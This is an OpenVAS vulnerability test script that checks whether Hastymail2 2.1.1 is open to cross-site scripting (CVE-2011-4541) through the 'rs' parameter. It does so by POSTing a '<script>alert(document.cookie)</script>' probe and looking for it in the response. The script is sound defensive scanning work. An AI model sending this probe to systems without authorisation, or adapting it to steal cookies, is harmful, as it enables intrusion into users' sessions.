###############################################################################
# OpenVAS Vulnerability Test
#
# Hastymail2 'rs' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902590");
  script_version("2019-05-13T14:05:09+0000");
  script_cve_id("CVE-2011-4541");
  script_bugtraq_id(50789);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
  script_tag(name:"creation_date", value:"2011-11-24 12:12:12 +0530 (Thu, 24 Nov 2011)");
  script_name("Hastymail2 'rs' Parameter Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50789");
  script_xref(name:"URL", value:"https://www.dognaedis.com/vulns/DGS-SEC-2.html");
  script_xref(name:"URL", value:"https://www.dognaedis.com/vulns/pdf/DGS-SEC-2.pdf");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_hastymail2_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("hastymail2/detected");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"Hastymail2 version 2.1.1.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input via
  the 'rs' parameter to index.php (when 'page' is set to 'mailbox' and
  'mailbox' is set to 'Drafts'), which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site.");

  script_tag(name:"solution", value:"Upgrade to Hastymail2 version 2.1.1 RC2 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"The host is running Hastymail2 and is prone to cross-site scripting
  vulnerability.");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!dir = get_dir_from_kb(port:port, app:"Hastymail2"))
  exit(0);

url = dir + "/index.php?page=mailbox&mailbox=Drafts";
postData = "rs=<script>alert(document.cookie)</script>";

host = http_host_name(port:port);

req = string("POST ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ", strlen(postData), "\r\n",
             "\r\n", postData);

res = http_keepalive_send_recv(port:port, data:req);
if(res =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< res){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
}
